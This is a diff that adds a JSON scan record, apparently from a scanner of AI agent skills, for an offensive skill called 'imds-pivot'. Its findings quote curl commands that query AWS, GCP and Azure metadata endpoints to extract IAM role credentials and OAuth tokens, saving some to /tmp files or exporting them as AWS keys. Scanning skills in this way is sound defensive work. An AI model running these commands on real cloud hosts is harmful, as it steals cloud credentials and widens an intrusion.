@@ -1,0 +1,255 @@
+{
+  "id": "mingyiseclab__mingyi-atlas__src~skills~standard~cloud~imds-pivot",
+  "owner": "MingyiSecLab",
+  "repo": "Mingyi-Atlas",
+  "path": "src/skills/standard/cloud/imds-pivot",
+  "name": "imds-pivot",
+  "description": "Pivot from SSRF or RCE to cloud Instance Metadata Service (IMDS) — extract IAM role creds, instance identity, user-data secrets.",
+  "stars": 14,
+  "category": "security",
+  "commit": "0b45282877b81c4025bfdd984c3a8202e6f68d50",
+  "contentHash": "2a78fdbd82fd4d431b06dc2aed3213f5c0e9201259e1cf3323b46657cf909dec",
+  "repoCreatedAt": "2026-05-31T09:53:05Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-16T10:15:16.941Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 36,
+        "excerpt": "ROLE=$(curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 36,
+        "excerpt": "ROLE=$(curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 37,
+        "excerpt": "curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\" > /tmp/creds.json",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 42,
+        "excerpt": "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 42,
+        "excerpt": "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 44,
+        "excerpt": "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 46,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 62,
+        "excerpt": "export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId /tmp/creds.json)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 71,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 71,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 82,
+        "excerpt": "H='Metadata-Flavor: Google'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 85,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 88,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' > /tmp/gcp.json",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 92,
+        "excerpt": "curl -s -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 96,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/project/project-id'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 99,
+        "excerpt": "curl -s -H \"$H\" 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 104,
+        "excerpt": "H='Metadata: true'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 107,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 110,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' > /tmp/azure.json",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254",
+          "management.azure.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 114,
+        "excerpt": "curl -s -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 118,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254",
+          "storage.azure.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "src/skills/standard/cloud/imds-pivot/SKILL.md",
+        "line": 121,
+        "excerpt": "curl -s -H \"$H\" 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254",
+          "vault.azure.net"
+        ]
+      }
+    ],
+    "findingTotals": {
+      "network": 16,
+      "shell": 6
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "0b45282877b81c4025bfdd984c3a8202e6f68d50",
+      "scannedAt": "2026-11-16T10:15:16.941Z",
+      "score": 92,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
